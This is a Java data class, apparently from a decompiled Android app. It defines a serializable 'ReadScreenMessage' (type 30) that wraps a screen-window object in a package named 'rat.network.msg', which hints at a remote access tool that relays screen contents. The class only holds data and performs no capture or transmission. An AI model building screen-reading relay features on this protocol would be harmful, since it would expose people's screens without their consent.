package com.vendor.rat.network.msg;

import androidx.annotation.NonNull;
import com.vendor.rat.auto.entity.ReadScreenWindow;
import java.io.Serializable;

public class ReadScreenMessage implements Serializable {
    private ReadScreenWindow body;
    private final Integer type = 30;

    public ReadScreenMessage(ReadScreenWindow readScreenWindow) {
        this.body = readScreenWindow;
    }

    public ReadScreenWindow getBody() {
        return this.body;
    }

    public Integer getType() {
        return this.type;
    }

    public void setBody(ReadScreenWindow readScreenWindow) {
        this.body = readScreenWindow;
    }

    @NonNull
    public String toString() {
        return "ReadScreenMessage{type=" + this.type + ", body=" + this.body + '}';
    }
}
